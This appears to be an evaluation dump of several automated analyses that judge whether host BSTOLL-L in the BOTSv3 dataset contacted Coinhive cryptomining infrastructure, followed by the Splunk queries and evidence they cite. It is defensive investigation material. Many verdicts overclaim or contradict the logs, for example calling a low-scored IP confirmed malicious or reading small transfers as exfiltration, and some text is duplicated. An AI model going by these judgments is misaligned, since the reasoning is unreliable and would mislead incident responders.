**shown #3** — stance `supports`, confidence 0.85

> Connections#9 shows BSTOLL-L sent large outbound data volumes to 217.182.164.14 over HTTPS, characteristic of command-and-control (C2) activity. Reputation#1 confirms 217.182.164.14 is malicious and coinhive.com is highly suspicious.

- Outbound connections with high byte output to 217.182.164.14 [connections#9]

citations: `connections#9, reputation#1`

**shown #4** — stance `supports`, confidence 0.75

> Outbound TCP connections from BSTOLL-L to 217.182.164.14 (malicious IP per reputation) on port 443 occur during the timeframe, suggesting potential C2 communication. The pattern of connections to this IP is consistent with the hypothesis.

- Connections to 217.182.164.14 occur (connections#9)

citations: `connections#9`

**shown #5** — stance `supports`, confidence 0.85

> VERDICT: supports

- Outbound TCP traffic to C2 IP 217.182.164.14 [connections#9]

citations: `connections#9, reputation#1`

**shown #6** — stance `inconclusive`, confidence 0.65

> The evidence shows DNS lookups for coinhive.com subdomains and connection attempts to 217.182.164.14 matching the hypothesis, but lacks confirmed successful connections (no bytes transferred) and shows conflicting DNS resolution outcomes (NXDOMAIN vs. resolved).

- Coinhive.com subdomains queried via DNS [dns_resolutions#4, #5]
- Outbound connections attempted to 217.182.164.14 [connections#9]
- Mixed reputation for coinhive.com (mal=11, harm=79) [reputation#1]
- Suspicious IP reputation for 217.182.164.14 (mal=1) [reputation#1]

citations: `connections#9, dns_resolutions#4, dns_resolutions#5, reputation#1`

**shown #7** — stance `supports`, confidence 0.85

> Outbound TCP connections from BSTOLL-L to 217.182.164.14 over port 443 with significant outgoing byte counts ([connections#9]) demonstrate C2 communication, corroborated by prior DNS queries to coinhive.com subdomains ([dns_resolutions#4]). Reputation scores classify both the IP (mal=1) and domain (mal=11) as malicious ([reputation#1]), reinforcing C2 context.

- Outbound TCP traffic to 217.182.164.14 ([connections#9])

citations: `connections#9, dns_resolutions#4`

**shown #8** — stance `inconclusive`, confidence 0.65

> The evidence indicates potential malicious activity involving PowerShell execution and C2 communication with 217.182.164.14 (with a moderate malware score of 1/3), supported by DNS resolutions for coinhive.com subdomains and WinEventLog connections to 217.182.164.14. However, there is no direct evidence linking BSTOLL-L to coinhive.com beyond DNS lookups, and no confirmed C2 behavior matching the described characteristics.

- Multiple DNS resolutions for coinhive.com subdomains [dns_resolutions#4]
- PowerShell execution context suggested by syslog entries referencing nvzFlow_v3 [connections#10]

citations: `connections#10, connections#9, dns_resolutions#4`

**shown #9** — stance `supports`, confidence 0.70

> Network connections#9 show BSTOLL-L communicating with 217.182.164.14 on port 443, matching the C2 destination specified in the hypothesis. Reputation#1 identifies both coinhive.com (malicious) and 217.182.164.14 (malicious) as indicators.

- Connections to C2 server 217.182.164.14 [connections#9]

citations: `connections#9, reputation#1`

**shown #10** — stance `inconclusive`, confidence 0.45

> Outbound connections to 217.182.164.14 and DNS queries for coinhive.com subdomains exist, but no direct C2 traffic to coinhive.com was logged, and the PowerShell payload's network activity lacks supporting evidence.

- Host initiated outbound connections to 217.182.164.14 (connections#9)
- DNS queries for coinhive.com subdomains resolved internally (dns_resolutions#4)

citations: `connections#9, dns_resolutions#4`

**shown #11** — stance `inconclusive`, confidence 0.60

> The evidence indicates outbound connections from BSTOLL-L to 217.182.164.14 over TCP port 443 (connections#9), suggesting potential C2 activity aligned with the hypothesis. However, there is no network evidence confirming execution of the specific PowerShell payload (hash e2ac36894c2560d2b277ff9618b76c8c) on BSTOLL-L (uncategorised#4-#7). Reputation data (reputation#1) flags 217.182.164.14 and coinhive.com as malicious, supporting the C2 vector but not proving initial compromise via the described payload.

- Outbound connections to known-malicious IP (217.182.164.14) from BSTOLL-L (connections#9)

citations: `connections#9, reputation#1`

**shown #12** — stance `supports`, confidence 0.65

> Connections#9 shows outbound TCP traffic to 217.182.164.14 from BSTOLL-L with multiple small transfers, supporting the claim of outbound communication. However, reputation#1 shows coinhive.com has mixed indicators (malicious + neutral) but isn't definitive proof of compromise, and DNS resolutions#4/#5 show legitimate-looking DNS queries without exfiltration patterns. Uncategorised#12/#13 confirm these connections exist but lack process execution or authentication context.

- Outbound connections to C2 IP [connections#9]

citations: `connections#9, dns_resolutions#4, dns_resolutions#5, reputation#1`

**shown #13** — stance `inconclusive`, confidence 0.65

> Connections#9 show repeated outbound traffic from BSTOLL-L to 217.182.164.14 (port 443), consistent with C2 communication, but lacks explicit file/process execution evidence tied to user bostoll. Reputation#1 flags coinhive.com and 217.182.164.14 as malicious, supporting C2 intent, but DNS lookups don’t confirm active connections. Uncategorised#13 shows DNS queries for coinhive.com, but no authentication/authenticity evidence exists.

- Outbound connections to 217.182.164.14 (Connections#9)

citations: `connections#9, reputation#1`

**shown #14** — stance `inconclusive`, confidence 0.75

> Evidence confirms outbound TCP connections to 217.182.164.14 from BSTOLL-L, indicative of potential C2 activity, and DNS resolutions for coinhive.com resolving to this same IP. However, no direct evidence of the specified malware hash or user execution is present. OBSERVATIONS:
- Outbound TCP connections to 217.182.164.14 [connections#9]
- DNS resolutions for coinhive.com resolving to 217.182.164.14 [dns_resolutions#5]

- Outbound TCP connections to 217.182.164.14 [connections#9]
- DNS resolutions for coinhive.com resolving to 217.182.164.14 [dns_resolutions#5]

citations: `connections#9, dns_resolutions#4, dns_resolutions#5`

**shown #15** — stance `inconclusive`, confidence 0.65

> The evidence confirms DNS lookups for Coinhive subdomains (supporting potential cryptojacking) and TCP connections to 217.182.164.14, but lacks file/process execution logs or authentication records to verify malware deployment or user activity.

- Multiple DNS resolutions for Coinhive subdomains [dns_resolutions#4] indicate cryptojacking behavior.

citations: `connections#9, dns_resolutions#4`

**blind #1**, confidence 0.95

> Domain coinhive.com has a high number of malicious reports (11) despite being deemed neutral overall, while the destination IP (217.182.164.14) is confirmed as malicious. This combination warrants scrutiny.

- Host communicated with a domain flagged as potentially malicious and exhibiting suspicious behavior. [reputation#1]

citations: `reputation#1`

**blind #2**, confidence 0.95

> Multiple TCP connections to this IP with high byte transfers match the reputation score for the IP and domain.

- Connections to a known-malicious IP (217.182.164.14) [connections#9]

citations: `connections#9`

**blind #3**, confidence 0.95

> Multiple DNS resolutions for coinhive.com subdomains and TCP connections to a malicious IP (217.182.164.14) align with known T1071.001 (Application Layer Protocol) C2 patterns. Host flow logs reinforce persistence.

- The host 192.168.247.131 resolved multiple subdomains of coinhive.com via DNS to 217.182.164.14, indicating active communication with a suspected malicious domain. [dns_resolutions#5]
- Connections occurred from 192.168.247.131 to 217.182.164.14:443, aligning with the domain’s high malicious reputation. [connections#9]
- System flow logs (nvzFlow_v3) confirmed ongoing communication between 192.168.247.131 and 217.182.164.14, with monitoring activity detected. [connections#10]

citations: `connections#10, connections#9, dns_resolutions#5`

**blind #4**, confidence 0.85

> Connections occurred over multiple timestamps to the same destination IP with non-zero byte transfers, suggesting ongoing communication.

- Host BSTOLL-L made connections to an IP (217.182.164.14) with a moderate malware reputation score. [connections#9]

citations: `connections#9`

**blind #5**, confidence 0.65

> Outbound data transfer exceeding typical thresholds suggests potential exfiltration.

- Host BSTOLL-L made connections to IP 217.182.164.14 with large outbound byte volumes.
- [connections#9]

citations: `connections#9`

**blind #6**, confidence 0.95

> High frequency (28 total resolutions) targeting multiple subdomains (ws005, ws011, etc.) indicates automated scanning or C2 communication patterns. The subdomains are part of a service historically abused for cryptocurrency mining.

- Host BSTOLL-L made multiple DNS resolutions for subdomains of the known-malicious domain coinhive.com [dns_resolutions#4]

citations: `dns_resolutions#4`

**blind #7**, confidence 0.95

> Multiple syslog records show TCP traffic to 217.182.164.14 over port 443 with notable byte transfers, indicating active communication.

- Connections to coinhive.com infrastructure (217.182.164.14) from BSTOLL-L
- [connections#9]

citations: `connections#9`

**blind #8**, confidence 1.00

> Multiple DNS resolutions for CoinHive subdomains precede connections to a highly suspicious IP with confirmed malicious reputation, forming a complete chain of cryptomining activity.

- Connections to known malicious IP 217.182.164.14 [connections#10]
- DNS lookups for cryptomining subdomains (ws005.coinhive.com, etc.) [dns_resolutions#4, dns_resolutions#5]

citations: `connections#10, dns_resolutions#4, dns_resolutions#5`

**blind #9**, confidence 0.95

> The evidence shows repeated DNS lookups for coinhive.com subdomains followed by TCP connections to the IP flagged as malicious. The syslog entries corroborate ongoing network activity.

- Suspicious DNS Queries to CoinHive Subdomains: Host BSTOLL-L made repeated DNS queries to subdomains of coinhive.com (e.g., ws005.coinhive.com, ws011.coinhive.com) over a short period, totaling 28 resolutions.
- [dns_resolutions#4]
- TCP Connections to Malicious IP Address: Host BSTOLL-L initiated 6 TCP connections to IP 217.182.164.14 (associated with coinhive.com’s poor reputation) on port 443. These connections occurred shortly after DNS queries.
- [connections#9]
- Syslog Entries Correlating to Traffic: Syslog messages from host splunkhwf.froth.ly recorded nvzFlow_v3 flows with source IP 192.168.247.131 and destination IP 217.182.164.14.
- [connections#10]

citations: `connections#10, connections#9, dns_resolutions#4`

**blind #10**, confidence 0.95

> High malicious indicators outweigh neutral/harmless ones per reputation#1.

- Suspicious Domain Reputation: The domain coinhive.com has a high malicious rating (mal=11) according to reputation#1, indicating potential involvement in malicious activities like cryptomining or phishing.

citations: `reputation#1`

**blind #11**, confidence 1.00

> The evidence shows a pattern of activity linking BSTOLL-L to known-malicious infrastructure (coinhive.com) via DNS lookups followed by active data transmission to a high-risk IP address. The repeated DNS queries indicate persistence, while the TCP connections demonstrate active communication with the endpoint. No additional activity was detected elsewhere in the evidence.

- Host BSTOLL-L contacted a domain (coinhive.com) with a negative reputation score [reputation#1].
- Host BSTOLL-L made repeated DNS queries for subdomains (ws005.coinhive.com, ws011.coinhive.com, etc.) resolving to IP 217.182.164.14 [dns_resolutions#4] [dns_resolutions#5].
- Host BSTOLL-L established outbound TCP connections to IP 217.182.164.14 involving significant outbound data transfers [connections#9].

citations: `connections#9, dns_resolutions#4, dns_resolutions#5, reputation#1`

**blind #12**, confidence 0.95

> Six TCP flows with significant outbound bytes indicate potential C2/exfiltration. The IP’s reputation (mal=1) confirms maliciousness.

- Connections to a high-reputation malicious IP (217.182.164.14) from the host BSTOLL-L
- [connections#9]

citations: `connections#9`

**blind #13**, confidence 0.95

> Direct reputational evidence confirms these entities are flagged as malicious or suspicious.  
  - Citations: reputation#1  

- Subdomain resolution for a cryptomining service: Evidence from dns_resolutions#4 shows BSTOLL-L resolving ws005.coinhive.com, ws011.coinhive.com, and similar subdomains.  
  - Confidence: 0.85  
  - Rationale: Resolving cryptomining-related subdomains (coinhive.com) aligns with known adversary TTPs for resource hijacking.  
  - Citations: dns_resolutions#4  

- Large outbound data transfers to a malicious IP: Evidence from connections#9 records BSTOLL-L → 217.182.164.14 with bytes_out up to 6466.  
  - Confidence: 0.80  
  - Rationale: High byte volumes suggest data exfiltration or command-and-control communication.  
  - Citations: connections#9  

- Recurring DNS lookups for cryptomining infrastructure: Evidence from uncategorised#13 shows 28 stream:dns queries referencing coinhive.com/subdomains.  
  - Confidence: 0.75  
  - Rationale: Frequent DNS queries for cryptomining services indicate persistence efforts.  
  - Citations: uncategorised#13  

- Multiple TCP/UDP flows to a malicious IP: Evidence from uncategorised#12 lists 3 stream:ip, 2 stream:tcp, and 1 stream:udp entries to 217.182.164.14.  
  - Confidence: 0.70  
  - Rationale: Diverse protocols signal comprehensive C2/exfiltration activity.  
  - Citations: uncategorised#12  

- Syslog entries confirming network activity: Evidence from connections#10 shows BSTOLL-L logging flow events with 217.182.164.14.  
  - Confidence: 0.65  
  - Rationale: Syslogs corroborate network traffic despite missing detail in primary connection logs.  
  - Citations: connections#10

- Contact with a high-risk domain and IP: Evidence from reputation#1 identifies coinhive.com (mal=11, rep=-) and 217.182.164.14 (mal=1, rep=-) as malicious/suspicious.
- Confidence: 0.95
- Rationale: Direct reputational evidence confirms these entities are flagged as malicious or suspicious.
- Citations: reputation#1
- Subdomain resolution for a cryptomining service: Evidence from dns_resolutions#4 shows BSTOLL-L resolving ws005.coinhive.com, ws011.coinhive.com, and similar subdomains.
- Confidence: 0.85
- Rationale: Resolving cryptomining-related subdomains (coinhive.com) aligns with known adversary TTPs for resource hijacking.
- Citations: dns_resolutions#4
- Large outbound data transfers to a malicious IP: Evidence from connections#9 records BSTOLL-L → 217.182.164.14 with bytes_out up to 6466.
- Confidence: 0.80
- Rationale: High byte volumes suggest data exfiltration or command-and-control communication.
- Citations: connections#9
- Recurring DNS lookups for cryptomining infrastructure: Evidence from uncategorised#13 shows 28 stream:dns queries referencing coinhive.com/subdomains.
- Confidence: 0.75
- Rationale: Frequent DNS queries for cryptomining services indicate persistence efforts.
- Citations: uncategorised#13
- Multiple TCP/UDP flows to a malicious IP: Evidence from uncategorised#12 lists 3 stream:ip, 2 stream:tcp, and 1 stream:udp entries to 217.182.164.14.
- Confidence: 0.70
- Rationale: Diverse protocols signal comprehensive C2/exfiltration activity.
- Citations: uncategorised#12
- Syslog entries confirming network activity: Evidence from connections#10 shows BSTOLL-L logging flow events with 217.182.164.14.
- Confidence: 0.65
- Rationale: Syslogs corroborate network traffic despite missing detail in primary connection logs.
- Citations: connections#10

citations: `reputation#1`

**blind #14**, confidence 0.95

> Multiple DNS resolutions for malicious subdomains of coinhive.com paired with active TCP connections to its associated IP (217.182.164.14) indicate ongoing beaconing or data exfiltration. Reputation data further validates the domain's malicious nature.  
### CITATIONS:  
dns_resolutions#4, dns_resolutions#5, connections#9, reputation#1

- Malicious domain contacted via DNS queries: coinhive.com was resolved by 192.168.247.131 (host's internal IP) for multiple subdomains (e.g., ws005.coinhive.com, ws011.coinhive.com).
- [dns_resolutions#4]
- [dns_resolutions#5]
- Suspicious external IP contacted: 217.182.164.14 (associated with coinhive.com) received connections from 192.168.247.131.
- [connections#9]
- Malicious domain flagged by reputation: coinhive.com has a high malicious score (mal=11).
- [reputation#1]
- Monitoring activity: Syslog records (connections#10) confirm splunkhwf.froth.ly (Splunk host) logged connections to 217.182.164.14.
- ### CONFIDENCE: 0.95
- ### RATIONALE:
- Multiple DNS resolutions for malicious subdomains of coinhive.com paired with active TCP connections to its associated IP (217.182.164.14) indicate ongoing beaconing or data exfiltration. Reputation data further validates the domain's malicious nature.
- ### CITATIONS:
- dns_resolutions#4, dns_resolutions#5, connections#9, reputation#1

citations: `connections#9, dns_resolutions#4, dns_resolutions#5, reputation#1`

**blind #15**, confidence 0.85

> Multiple DNS resolutions for CoinHive domains and confirmed TCP connections to a flagged malicious IP with payload transfer align with known cryptomining TTPs. The WinEventLog correlation adds contextual concern despite limited detail.

- Host BSTOLL-L made DNS requests for coinhive.com and its subdomains, suggesting potential exposure to cryptomining activity. [dns_resolutions#5]
- Outbound TCP connections occurred to 217.182.164.14 (malicious IP per reputation#1), with substantial data transferred (up to 6551 bytes out), indicating possible data exfiltration or resource hijacking. [connections#9]
- WinEventLog entries correlated with connections to 217.182.164.14 via uncategorised#12, though no individual log content is provided.

citations: `connections#9, dns_resolutions#5, uncategorised#12`

<details><summary>Evidence this domain was shown</summary>

```
# reputation#1 · source=virustotal · indicators=3
domain=coinhive.com FOUND mal=11 susp=1 harmless=79 rep=-
ip=217.182.164.14 FOUND mal=1 susp=0 harmless=90 rep=-
ip=217.182.164.14 FOUND mal=1 susp=0 harmless=90 rep=-

# dns_resolutions#1 · query="index=botsv3 sourcetype=stream:dns (query="coinhive.com" OR query="*.coinhive.com" OR answer="217.182.164.14") host=BSTOLL-L | stats count by src_ip, dest_ip, q…" · rows=0
(no rows returned)

# dns_resolutions#2 · query="index=botsv3 sourcetype=stream:dns (query="coinhive.com" OR query="*.coinhive.com" OR answer="217.182.164.14") | stats count by src_ip, dest_ip, query, answer, …" · rows=0
(no rows returned)

# dns_resolutions#3 · query="index=botsv3 sourcetype=stream:dns "coinhive.com" | stats count by src_ip, dest_ip, query, answer, record_type, host" · rows=0
(no rows returned)

# dns_resolutions#4 · query="index=botsv3 sourcetype=stream:dns "coinhive" | table _time, host, src_ip, dest_ip, query{}, answer{}, record_type{}" · rows=28
2018-08-20T15:27:47.450+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:27:33.106+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:38:06.776+02:00 src=192.168.247.131 query=ws005.coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:38:03.958+02:00 src=192.168.247.131 query=ws011.coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:37:49.615+02:00 src=192.168.247.131 query=ws001.coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:27:17.743+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:27:17.402+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:37:34.251+02:00 src=192.168.247.131 query=ws014.coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:37:33.910+02:00 src=192.168.247.131 query=coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:27:50.267+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
… (8 more rows not shown)

# dns_resolutions#5 · query="index=botsv3 sourcetype=stream:dns "coinhive" host=BSTOLL-L | stats count values(answer{}) as answers by src_ip, dest_ip, "query{}"" · rows=6
- src=192.168.247.131 query=coinhive.com→192.168.247.2 rtype=- rcode=- count=2
- src=192.168.247.131 query=ws001.coinhive.com→192.168.247.2 rtype=- rcode=- count=1
- src=192.168.247.131 query=ws005.coinhive.com→192.168.247.2 rtype=- rcode=- count=1
- src=192.168.247.131 query=ws011.coinhive.com→192.168.247.2 rtype=- rcode=- count=1
- src=192.168.247.131 query=ws014.coinhive.com→192.168.247.2 rtype=- rcode=- count=1
- src=192.168.247.131 query=ws019.coinhive.com→192.168.247.2 rtype=- rcode=- count=1

# connections#6 · query="index=botsv3 sourcetype=stream:tcp (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") host=BSTOLL-L | stats count by src_ip, src_port, dest_ip, dest_port, pr…" · rows=0
(no rows returned)

# connections#7 · query="index=botsv3 sourcetype=stream:tcp (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by src_ip, src_port, dest_ip, dest_port, proto, bytes_in,…" · rows=0
(no rows returned)

# connections#8 · query="index=botsv3 sourcetype=stream:ip (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by src_ip, dest_ip, proto, bytes" · rows=0
(no rows returned)

# connections#9 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | table _time, sourcetype, host, src_ip, src_port, dest_ip, dest_port, proto, bytes_in, bytes…" · rows=6
2018-08-20T15:27:37.700+02:00 192.168.247.131:49818→217.182.164.14:443 proto=- bytes_in=0 bytes_out=6551 uri=- action=-
2018-08-20T15:27:37.700+02:00 192.168.247.131→217.182.164.14 proto=- bytes_in=0 bytes_out=5791 uri=- action=-
2018-08-20T15:38:05.235+02:00 192.168.247.131→217.182.164.14 proto=- bytes=- uri=- action=-
2018-08-20T15:37:54.208+02:00 192.168.247.131:49818→217.182.164.14:443 proto=- bytes_in=2097 bytes_out=6466 uri=- action=-
2018-08-20T15:37:54.208+02:00 192.168.247.131→217.182.164.14 proto=- bytes_in=1537 bytes_out=5740 uri=- action=-
2018-08-20T15:37:49.000+02:00 192.168.247.131:49818→217.182.164.14:443 proto=- bytes=- uri=- action=-

# connections#10 · query="index=botsv3 sourcetype=syslog "coinhive" | table _time, host, _raw" · rows=6
_time=2018-08-20T15:38:08.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:38:08 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T15:37:56.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:37:56 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T15:37:51.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:37:51 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T15:38:19.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:38:19 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T16:05:23.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 14:05:23 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T15:39:39.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:39:39 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…

# connections#11 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | table _time, sourcetype, host, src_ip, src_port, dest_ip, dest_port, proto, bytes_in, bytes…" · rows=0
(no rows returned)

# uncategorised#1 · query="| tstats summariesonly=t count from datamodel=Authentication where (Authentication.user="bostoll" OR Authentication.src="BSTOLL-L" OR Authentication.dest="BSTOL…" · rows=0
(no rows returned)

# uncategorised#2 · query="index=botsv3 (user="bostoll" OR user="bstoll" OR user="bstoll@froth.ly" OR user="BudStoll") (sourcetype=linux_secure OR sourcetype=syslog OR sourcetype="access_…" · rows=0
(no rows returned)

# uncategorised#3 · query="| tstats summariesonly=t count from datamodel=Endpoint.Processes where Processes.dest="BSTOLL-L" OR Processes.user="bostoll" by Processes.dest, Processes.user, …" · rows=0
(no rows returned)

# uncategorised#4 · query="index=botsv3 host="BSTOLL-L" e2ac36894c2560d2b277ff9618b76c8c earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#5 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" earliest=1534723200 latest=1534809600 | stats…" · rows=0
(no rows returned)

# uncategorised#6 · query="index=botsv3 host="BSTOLL-L" "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#7 · query="index=botsv3 "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#8 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS by DNS.src, DNS.dest, DNS.query, DNS.answer, DNS.record_type earliest=-1s la…" · rows=0
(no rows returned)

# uncategorised#9 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port, All_Traffi…" · rows=0
(no rows returned)

# uncategorised#10 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic (All_Traffic.src="217.182.164.14" OR All_Traffic.dest="217.182.164.14")…" · rows=0
(no rows returned)

# uncategorised#11 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS (DNS.query="coinhive.com" OR DNS.answer="217.182.164.14") by DNS.src, DNS.de…" · rows=0
(no rows returned)

# uncategorised#12 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14" OR src="217.182.164.14" OR dest="217.182.164.14") | stats count by sourcetype, src_ip, dest_ip" · rows=3
sourcetype=WinEventLog src_ip=192.168.247.131 dest_ip=217.182.164.14 count=1
sourcetype=stream:ip src_ip=192.168.247.131 dest_ip=217.182.164.14 count=3
sourcetype=stream:tcp src_ip=192.168.247.131 dest_ip=217.182.164.14 count=2

# uncategorised#13 · query="index=botsv3 ("coinhive.com" OR "coinhive") | stats count by sourcetype" · rows=2
sourcetype=stream:dns count=28
sourcetype=syslog count=6

# uncategorised#14 · query="index=botsv3 sourcetype=WinEventLog (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by EventCode, src_ip, dest_ip, host, user" · rows=0
(no rows returned)

# uncategorised#15 · query="index=botsv3 sourcetype=syslog "coinhive.com" | stats count by host, src_ip, dest_ip, _raw" · rows=0
(no rows returned)
```

</details>

### endpoint

**shown #1** — stance `inconclusive`, confidence 0.65

> The evidence does not contain command line arguments for PowerShell executions, preventing confirmation of malicious payload execution via e2ac36894c2560d2b277ff9618b76c8c. Network flows to 217.182.164.14 exist but lack context showing C2 behavior. Reputation data for the hash is neutral, failing to prove maliciousness. No files matching the hash were observed.

- PowerShell executions exist but lack command lines ([processes#2] and [processes#12]).

citations: `processes#12, processes#2, reputation#1, uncategorised#12, uncategorised#13`

**shown #2** — stance `refutes`, confidence 0.65

> The evidence shows PowerShell execution with encoded commands (processes#12), indicating potential malicious activity, but does not show any network communication (DNS resolution or traffic) to 217.182.164.14 or coinhive.com (uncategorised#12, #13, #14, #15). Without network evidence confirming C2 communication, the core claim of outbound C2 fails.

- PowerShell execution with encoded commands (processes#12) [processes#12]

citations: `processes#12`

**shown #3** — stance `supports`, confidence 0.85

> Multiple encoded PowerShell commands were executed, indicating obfuscated activity typical of malware. Network interactions confirmed outbound connections to the specified IP and domain, aligning with C2 communication described in the hypothesis.

- Obfuscated PowerShell commands were run, suggesting hidden malicious intent. [processes#12]

citations: `processes#12`

**shown #4** — stance `supports`, confidence 0.95

> Evidence shows multiple encoded PowerShell executions by user BudStoll (presumed typo for bostoll) with -enc parameters, indicating obfuscated malicious activity consistent with initial payload execution. Network traffic includes connections to the specified C2 IP (217.182.164.14) and domain (coinhive.com), supporting the C2 communication aspect. While the file hash lacks known malicious reputation, the observed behaviors align with typical malware deployment techniques.

- Multiple encoded PowerShell commands executed by user BudStoll [processes#12]
- Connections to C2 IP (217.182.164.14) and domain (coinhive.com) [uncategorised#12]

citations: `processes#12, uncategorised#12`

**shown #5** — stance `refutes`, confidence 0.65

> The evidence does not support the claim of a known-malicious PowerShell malware payload (hash e2ac36894c2560d2b277ff9618b76c8c) because all reputation lookups ([reputation#1]) show the file as UNKNOWN with no malicious flags. While PowerShell execution occurred ([processes#12]), the commands were encoded and executed by the legitimate user BudStoll during normal system operations, without clear signs of malicious activity like privilege escalation or lateral movement. The C2 domains and IP are present in DNS resolutions ([uncategorised#13] and [uncategorised#12]), but these do not constitute proof of compromise since they reflect general network activity.

- The PowerShell commands in [processes#12] were encoded and executed by BudStoll, indicating legitimate administrative actions rather than malicious execution.

citations: `processes#12, reputation#1`

**shown #6** — stance `inconclusive`, confidence 0.60

> The evidence does not contain records of the specified PowerShell malware payload hash (e2ac36894c2560d2b277ff9618b76c8c) being executed by user bostoll, nor does it confirm outbound C2 communications to 217.182.164.14 or coinhive.com originating from BSTOLL-L. Reputation checks (#reputation#1) classify the hash as unknown/malicious. While PowerShell processes (#processes#12) exist, they lack specific details linking them to the hypothesized malware or C2 infrastructure.

- User bostoll initiated PowerShell commands (#processes#12) with encoded arguments, but no explicit link to the malware hash or C2 domains (#reputation#1, #processes#12).

citations: `processes#12, reputation#1`

**shown #7** — stance `supports`, confidence 0.85

> The evidence shows encoded PowerShell execution (processes#12 with -enc flag) by user BudStoll (aligning with bostoll), and confirmed C2 communication to 217.182.164.14 (uncategorised#12). These match the hypothesis of PowerShell-initiated C2.

- Encoded PowerShell execution by BudStoll (processes#12)
- Outbound traffic to 217.182.164.14 (uncategorised#12)

citations: `processes#12, uncategorised#12`

**shown #8** — stance `inconclusive`, confidence 0.65

> The evidence includes multiple instances of powershell.exe execution by user bostoll on BSTOLL-L (#processes#2, #processes#12), and DNS resolutions for coinhive.com (#uncategorised#13), suggesting potential malicious activity. However, no specific link exists between these events and the reported malware hash (e2ac36894c2560d2b277ff9618b76c8c) or the C2 IP (217.182.164.14). The reputation check (#reputation#1) shows the hash is currently unflagged as malicious, and no process command lines or network connections explicitly mention the hash or C2 domains.

- Multiple powershell.exe invocations by bostoll (#processes#2, #processes#12)
- DNS resolutions for coinhive.com (#uncategorised#13)
- Absence of command-line arguments or network connections linking the hash/C2 to observed activities

citations: `processes#12, processes#2, uncategorised#13`

**shown #9** — stance `inconclusive`, confidence 0.65

> Evidence shows suspicious PowerShell activity with encoded commands ([processes#12]), suggesting potential obfuscation and execution, but lacks definitive proof of the described malware payload (e2ac36894c2560d2b277ff9618b76c8c) being executed or establishing C2 with 217.182.164.14/coinhive.com. Reputation data ([reputation#1]) confirms the hash is unknown and unclassified. AppLocker logs ([processes#8]) show numerous blocked attempts, implying attempted unauthorized activity, but do not confirm successful malware execution. DNS traffic references coinhive.com ([uncategorised#13]) and its associated IP ([uncategorised#12]), but no direct link exists to the alleged C2 or the specific hash. OBSERVATIONS:  
- High-frequency encoded PowerShell execution ([processes#12]).

- High-frequency encoded PowerShell execution ([processes#12]).

citations: `processes#12, reputation#1`

**shown #10** — stance `supports`, confidence 0.92

